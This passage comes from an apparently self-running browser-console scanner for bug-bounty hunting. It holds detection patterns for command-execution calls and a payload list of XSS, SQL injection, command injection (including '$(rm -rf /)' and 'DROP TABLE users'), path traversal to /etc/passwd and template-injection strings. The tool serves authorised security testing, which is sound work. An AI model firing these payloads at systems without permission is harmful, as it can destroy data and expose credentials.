  /setInterval\s*\(\s*['"`]/gi,
  /exec\s*\(/gi,
  /spawn\s*\(/gi,
  /child_process/gi,
  /require\s*\(\s*['"`]child_process['"`]\s*\)/gi,

  // New additions
  /process\.mainModule\.require\s*\(\s*['"`]child_process['"`]\s*\)/gi, // Hidden require
  /vm\.runInNewContext\s*\(/gi,               // Node.js VM execution
  /vm\.runInThisContext\s*\(/gi,
  /vm\.createScript\s*\(/gi,
  /Deno\.run\s*\(/gi,                         // Deno command execution
  /system\s*\(/gi,                            // PHP system()
  /passthru\s*\(/gi,                          // PHP passthru()
  /shell_exec\s*\(/gi,                        // PHP shell_exec()
  /popen\s*\(/gi,                             // PHP popen()
  /proc_open\s*\(/gi,                         // PHP proc_open()
  /Runtime\.getRuntime\(\)\.exec\s*\(/gi,     // Java Runtime exec
  /ProcessBuilder\s*\(/gi,                    // Java ProcessBuilder
  /groovy\.util\.Eval\.me\s*\(/gi,            // Groovy Eval
  /javax\.script\.ScriptEngineManager/gi,    // Java ScriptEngine
  /subprocess\.(Popen|call|run|check_output)\s*\(/gi, // Python subprocess
  /os\.system\s*\(/gi,                        // Python os.system
  /os\.popen\s*\(/gi,                         // Python os.popen
  /pty\.spawn\s*\(/gi,                        // Python pty.spawn
  /importlib\.import_module\s*\(/gi,          // Python dynamic import
  /eval\(/gi,                                 // Ruby eval
  /exec\s+.+/gi,                              // Ruby exec
  /IO\.popen\s*\(/gi,                         // Ruby IO.popen
  /Open3\.(popen|capture|pipeline)/gi,        // Ruby Open3
  /backticks\s*`[^`]+`/gi,                    // Shell backticks in Ruby/JS
  /%x\([^)]*\)/gi,                            // Ruby %x() shell execution
  /perl\s+-e/gi,                              // Perl inline execution
  /system\s+['"`][^'"`]+['"`]/gi              // Generic system call
];

      const scripts = Array.from(document.querySelectorAll("script"));
      const jsContent = scripts.map((s) => s.innerHTML).join("\n");

      rcePatterns.forEach((pattern) => {
        let match;
        while ((match = pattern.exec(jsContent)) !== null) {
          this.addVulnerability("RCE", "CRITICAL", {
            pattern: pattern.source,
            match: match[0],
            description: "Potential RCE vector in JavaScript",
          });
        }
      });

      // Check for command execution patterns in endpoints
      this.discoveredEndpoints.forEach((endpoint) => {
        if (endpoint.url.includes("exec") || endpoint.url.includes("cmd") || endpoint.url.includes("shell")) {
          this.addVulnerability("RCE", "HIGH", {
            endpoint: endpoint.url,
            description: "Endpoint with command execution indicators",
          });
        }
      });
    }

    // 🎪 Payload generation for testing
    generatePayloads() {
      return {
        xss: [
          '<script>alert("XSS")</script>',
          '"><script>alert("XSS")</script>',
          "';alert('XSS');//",
          'javascript:alert("XSS")',
          '<img src=x onerror=alert("XSS")>',
          '<iframe src="javascript:alert(\'XSS\')"></iframe>',
          '<svg onload=alert("XSS")>',
        ],
        dom_xss: [
          'javascript:alert("DOM XSS")',
          '<img src=x onerror=alert("DOM XSS")>',
          '"><script>alert("DOM XSS")</script>',
          'location.hash=<script>alert("DOM XSS")</script>',
        ],
        sqli: [
          "' OR '1'='1",
          "'; DROP TABLE users; --",
          "1' UNION SELECT NULL--",
          "admin'--",
          "' OR 1=1#",
          "'; EXEC xp_cmdshell('net user') --",
        ],
        cmd_injection: [
          "; ls -la",
          "| cat /etc/passwd",
          "`whoami`",
          "$(rm -rf /)",
          "; net user",
        ],
        idor: [
          "../../../etc/passwd",
          "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
          "/admin/users/1",
          "/api/user/2",
          "?id=1&id=2",
          "/user/profile/123",
        ],
        lfi: [
          "../../../etc/passwd",
          "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
          "/etc/passwd",
          "....//....//....//etc/passwd",
          "php://filter/convert.base64-encode/resource=index.php",
        ],
        ssti: [
          "{{7*7}}",
          "${7*7}",
          "<%= 7*7 %>",
          "{{config}}",
          "{{self.__class__.__bases__[0].__subclasses__()}}",
        ],
        csrf: [
          "SameSite=None",
          "missing csrf token",
          "predictable token pattern",
        ],
      };
    }

    // 🎯 Quick attack surface summary
    quickSummary() {
      console.log(
        "%c🎯 QUICK ATTACK SURFACE SUMMARY",
        "color: cyan; font-weight: bold; font-size: 16px;"
      );

      const summary = {
        "🔐 Authentication": (this.attackSurface.get("AUTHENTICATION") || [])
          .length,
        "🛡️ Access Control": (this.attackSurface.get("ACCESS_CONTROL") || [])
          .length,
        "📝 Data Input": (this.attackSurface.get("DATA_INPUT") || []).length,
        "💰 Business Logic": (this.attackSurface.get("BUSINESS_LOGIC") || [])
          .length,
        "🔌 API Endpoints": (this.attackSurface.get("API_ENDPOINTS") || [])
          .length,
      };

      Object.entries(summary).forEach(([category, count]) => {
        if (count > 0) {
          console.log(`${category}: ${count} endpoints`);
        }
      });

      const totalVulns = this.vulnerabilities.length;
      const criticalVulns = this.vulnerabilities.filter(
        (v) => v.severity === "CRITICAL"
      ).length;

      console.log(
        `\n🚨 Vulnerabilities: ${totalVulns} total (${criticalVulns} critical)`
      );
      console.log(`🎯 High-risk targets: ${this.getHighRiskCount()}`);
    }

    // 🔥 Export hunting data
    exportResults() {
      const results = this.getResults();
      const exportData = JSON.stringify(results, null, 2);

      // Create downloadable file
      const blob = new Blob([exportData], { type: "application/json" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `bug-bounty-hunt-${Date.now()}.json`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);

      console.log("📁 Results exported to JSON file");
    }
  }

  // 🚀 Initialize the hunter
  const hunter = new CriticalFlawHunter();

  // 🎯 Global interface for console usage
  window.hunter = hunter;
  window.FlawHunter = CriticalFlawHunter;

  // 🔥 Auto-start hunting
  console.log(
    "%c🚀 Starting automatic hunt...",
    "color: orange; font-weight: bold;"
  );
  hunter.hunt().then(() => {
    console.log(
      "%c🎯 Initial hunt complete! Use these commands:",
      "color: green; font-weight: bold;"
    );
    console.log(
      "%c  hunter.quickSummary()     - Show quick summary",
      "color: lightblue;"
    );
    console.log(
      "%c  hunter.deepScan()         - Run deep vulnerability scan",
      "color: lightblue;"
    );
    console.log(
      "%c  hunter.exportResults()    - Export results to JSON",
      "color: lightblue;"
    );
    console.log(
      "%c  hunter.generatePayloads() - Get testing payloads",
      "color: lightblue;"
    );
    console.log(
      "%c🔥💀 Happy Bug Hunting! 💀🔥",
      "color: red; font-weight: bold;"
    );
  });

  // 🎪 Quick access functions
  window.quickHunt = () => hunter.hunt();
  window.deepHunt = () => hunter.deepScan();
  window.exportHunt = () => hunter.exportResults();
  window.payloads = () => hunter.generatePayloads();
})();
